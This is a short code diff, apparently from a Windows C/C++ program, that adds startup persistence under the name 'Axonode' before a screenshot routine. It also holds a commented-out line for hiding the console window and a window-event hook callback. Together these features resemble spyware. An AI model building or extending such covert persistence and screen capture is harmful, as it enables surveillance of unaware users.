@@ -106,6 +106,9 @@ VOID CALLBACK WinEventProcCallback(HWINEVENTHOOK hWinEventHook, DWORD dwEvent, H
 
 int main()
 {	
+	if (getStartup(L"Axonode") == FALSE)
+		addStartup();
+		
 	//ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false); //Hides the console window
 	getScreenShot();
 
